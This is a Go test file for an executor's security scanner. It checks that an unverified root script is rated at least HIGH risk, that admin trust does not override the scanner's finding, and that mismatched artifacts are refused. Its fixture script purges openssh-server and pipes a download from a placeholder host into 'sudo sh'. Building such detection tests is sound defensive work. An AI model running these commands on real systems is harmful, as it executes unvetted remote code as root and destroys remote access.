// SPDX-License-Identifier: AGPL-3.0-or-later

package security

import (
	"testing"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"

	pb "github.com/nebula-operation-station/nebula-operation-station/internal/rpc/executorv1"
)

// Milestone 7 (spec 10): effective risk = max(declared, scanner, trust
// floor), all derived by the executor.

var riskyScript = []byte("#!/bin/sh\nsudo -n apt-get -y purge openssh-server\ncurl -fsSL https://get.example/x.sh | sudo -n sh\n")

// Acceptance: an unverified root script is at least HIGH, whatever the
// server labels it, and the executor's scanner raises a trusted one too.
func TestM7_UnverifiedRootScriptIsAtLeastHigh(t *testing.T) {
	h := newHarness(t, harnessOptions{untrusted: true})
	h.setCriticality("dockerflux", riskLow)
	h.setCriticality("strompi", riskLow)
	h.openSession()
	req := func(risk pb.RiskClass) *pb.ExecutionRequest {
		r := h.request(risk)
		r.ArtifactSha256 = hexSum(riskyScript)
		return r
	}
	for _, risk := range []pb.RiskClass{riskLow, riskMedium} {
		_, err := h.client.ProposeExecution(h.ctx(), &pb.ProposeExecutionRequest{Request: req(risk), ParametersJson: params, Artifact: riskyScript})
		if status.Code(err) != codes.InvalidArgument {
			t.Fatalf("%v proposal of an unverified root script: %v", risk, err)
		}
	}
	p, err := h.client.ProposeExecution(h.ctx(), &pb.ProposeExecutionRequest{Request: req(riskLow), ParametersJson: params,
		Artifact: riskyScript, RaiseToMinimum: true})
	if err != nil || p.GetRiskClass() != riskHigh {
		t.Fatalf("%v %v", p.GetRiskClass(), err)
	}

	// Trusted as LOW by the admin: the scanner still says HIGH.
	if _, err := h.client.TrustArtifact(h.ctx(), &pb.TrustArtifactRequest{ActionId: testAction, ModuleVersion: testVersion,
		RiskClass: riskLow, Artifact: riskyScript, Label: "scanner test"}); err != nil {
		t.Fatal(err)
	}
	_, err = h.client.ProposeExecution(h.ctx(), &pb.ProposeExecutionRequest{Request: req(riskLow), ParametersJson: params, Artifact: riskyScript})
	if status.Code(err) != codes.InvalidArgument {
		t.Fatalf("trusted LOW, scanner HIGH: %v", err)
	}
	h.requireAudit("safety scanner", "download_and_execute", "package_removal")

	// Bytes that do not hash to the request's artifact are refused.
	_, err = h.client.ProposeExecution(h.ctx(), &pb.ProposeExecutionRequest{Request: req(riskHigh), ParametersJson: params, Artifact: script})
	if status.Code(err) != codes.InvalidArgument {
		t.Fatalf("mismatched artifact: %v", err)
	}
}
